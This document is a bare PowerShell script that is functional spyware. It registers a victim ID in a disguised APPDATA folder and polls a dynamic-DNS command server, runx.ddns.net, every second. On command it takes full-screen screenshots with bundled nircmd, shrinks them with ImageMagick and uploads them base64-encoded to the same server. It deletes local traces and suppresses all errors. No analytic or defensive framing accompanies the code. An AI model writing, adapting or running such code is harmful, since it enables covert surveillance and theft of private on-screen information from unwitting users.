$mutex = New-Object System.Threading.Mutex($false, "ss_control")
if (-not $mutex.WaitOne(0)) { exit }

# Create ID
$IdPath = "$env:APPDATA\Microsoft\run\run.txt"
if (Test-Path $IdPath) {
  $raw = (Get-Content $IdPath -Raw).Trim()
  if ($raw.Length -ge 8) {
    $uniqueId = $raw.Substring(0, 8)
  }
  else {
    $uniqueId = $raw
  }
}
else {
  $uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)
  Set-Content -Path $IdPath -Value $uniqueId
}
$uniqueUser = "$($env:USERNAME)-$uniqueId-W"

$UserFolder = Join-Path (Join-Path $env:TEMP "frames-repo") $uniqueUser
if (!(Test-Path $UserFolder)) {
  $null = New-Item $UserFolder -ItemType Directory
}

Add-Type -AssemblyName System.Drawing

$VPS_POLL_URL = "http://runx.ddns.net/api/poll"
$VPS_UPLOAD_URL = "http://runx.ddns.net/api/upload"

while ($true) {
  try {
    $response = Invoke-RestMethod -Method Get -Uri "$VPS_POLL_URL?username=$uniqueUser" -TimeoutSec 10

    if ($response -and $response.capture -eq $true) {
      $Timestamp = Get-Date -Format "yyyyMMddHHmmssfff"
      $RawPath = Join-Path $UserFolder "raw_$Timestamp.png"
      $JpegPath = Join-Path $UserFolder "$Timestamp.jpg"

      # Capture screenshot using NirCmd
      Start-Process -FilePath "$env:TEMP\run\nircmd\nircmd.exe" -ArgumentList "savescreenshotfull `"$RawPath`"" -Wait -NoNewWindow

      # Convert to JPEG using ImageMagick
      if (Test-Path $RawPath) {
        $MagickExe = "$env:TEMP\run\magick\magick.exe"
        $magickArgs = "`"$RawPath`" -colorspace gray -resize 50% -quality 80 `"$JpegPath`""
        Start-Process -FilePath $MagickExe -ArgumentList $magickArgs -Wait -NoNewWindow
        Remove-Item $RawPath -Force
      }

      # Upload JPEG to VPS
      if (Test-Path $JpegPath) {
        $fileBytes = [System.IO.File]::ReadAllBytes($JpegPath)
        $base64Image = [Convert]::ToBase64String($fileBytes)
        $body = @{
          username = $uniqueUser
          filename = (Get-Item $JpegPath).Name
          image = $base64Image
        } | ConvertTo-Json -Compress

        Invoke-RestMethod -Method Post -Uri $VPS_UPLOAD_URL -ContentType "application/json" -Body $body -TimeoutSec 10 | Out-Null
        Remove-Item $JpegPath -Force
      }
    }
  }
  catch {}

  Start-Sleep -Seconds 1
}
